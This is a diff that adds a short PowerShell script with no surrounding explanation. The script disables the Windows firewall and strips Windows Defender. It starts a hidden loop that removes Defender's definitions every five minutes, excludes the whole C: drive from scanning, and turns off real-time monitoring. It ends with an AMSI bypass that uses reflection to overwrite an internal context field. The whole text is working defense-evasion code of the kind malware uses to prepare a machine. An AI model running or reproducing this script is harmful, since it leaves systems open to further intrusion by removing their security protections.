@@ -1,0 +1,9 @@
+netsh advfirewall set allprofiles state off
+
+start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden
+
+Set-MpPreference -ExclusionPath "c:\"
+Set-MpPreference -DisableRealtimeMonitoring $true
+& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
+
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
